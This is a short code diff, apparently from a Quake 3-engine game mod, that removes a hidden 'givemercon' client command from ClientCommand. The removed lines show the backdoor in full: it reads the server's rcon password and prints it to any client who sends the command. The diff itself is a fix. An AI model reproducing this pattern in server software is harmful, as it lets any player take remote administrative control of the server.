@@ -3947,14 +3947,6 @@ void ClientCommand( int clientNum ) {
 		trap_LinkEntity(cover);
 	}
 
-	if(Q_stricmp(cmd, "givemercon") == 0)
-	{
-		char rconpass[1024];
-		trap_Cvar_VariableStringBuffer("rconPassword", rconpass, sizeof(rconpass));
-		trap_SendServerCommand( ent-g_entities, va("print %s\n", rconpass) );
-		return;
-	}
-
 	if (Q_stricmp (cmd, "say") == 0) {
 		Cmd_Say_f (ent, SAY_ALL, qfalse);
 		return;
